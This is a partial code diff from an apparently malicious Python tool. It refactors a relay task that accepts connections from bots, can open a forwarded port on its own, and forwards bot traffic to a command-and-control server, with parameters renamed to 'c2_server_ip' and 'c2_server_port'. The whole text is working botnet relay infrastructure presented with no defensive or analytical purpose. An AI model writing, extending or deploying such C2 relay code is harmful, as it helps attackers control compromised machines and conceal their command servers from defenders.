@@ -3,7 +3,6 @@ import socket
 
 from tasks.__task import Task
 from tasks.forwaded_ports import ForwadedPorts
-from utils import threaded_task
 
 
 class _Bot(Task):
@@ -19,11 +18,10 @@ class _Bot(Task):
 
         self._run = threading.Event()
 
-    @threaded_task
-    def start(self, bot_socket: socket.socket, bot_ip, bot_port, server_ip, server_port):
+    def run(self, bot_socket: socket.socket, bot_ip, bot_port, c2_server_ip, c2_server_port):
         from time import sleep
 
-        server_socket = socket.create_connection((server_ip, server_port), timeout=1)
+        server_socket = socket.create_connection((c2_server_ip, c2_server_port), timeout=1)
         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         self.logger.info("Entering relay loop for bot {}:{}".format(bot_ip, bot_port))
@@ -101,20 +99,19 @@ class Relay(Task):
         self.server.settimeout(5)
         self._run = threading.Event()
 
-    @threaded_task
-    def start(self, port=0, max_client=0, server_ip: str = "127.0.0.1", server_port: int = 8192):
+    def run(self, c2_server_ip: str = "127.0.0.1", c2_server_port=8192, **kwargs):
+        assert "port" in kwargs, "Missing keyword argument port!"
+        assert "max_clients" in kwargs, "Missing keyword argument max_clients!"
+
+        port = int(kwargs.get("port"))
+        max_clients = int(kwargs.get("max_clients"))
+
+        assert max_clients >= 0, "Max client amount must be >= 0!"
+        assert port >= 0, "Port must be >= 0!"
+
         from time import sleep
-
-        self.logger.info("Starting task {}".format(self.__class__.__name__))
         ip = socket.gethostbyname(socket.gethostname())
-
-        if max_client < 0:
-            raise ValueError("Max client amount must be >= 0!")
-
-        if port < 0:
-            raise ValueError("Port must be >= 0!")
-
-        elif port == 0:
+        if port == 0:
             try:
                 port = ForwadedPorts(0)
                 session = port.start()
@@ -136,7 +133,7 @@ class Relay(Task):
 
         while self._run.is_set():
             try:
-                if max_client and len(self.bots) >= max_client:
+                if max_clients and len(self.bots) >= max_clients:
                     continue
 
                 else:
@@ -145,7 +142,7 @@ class Relay(Task):
                     self.logger.info("Connection from {}:{}".format(addr[0], addr[1]))
 
                     bot = _Bot()
-                    bot.set_thread(bot.start(sock, addr[0], addr[1], server_ip, server_port))
+                    bot.set_thread(bot.start(sock, addr[0], addr[1], c2_server_ip, c2_server_port))
                     self.bots.append(bot)
 
                     for bot in self.bots:
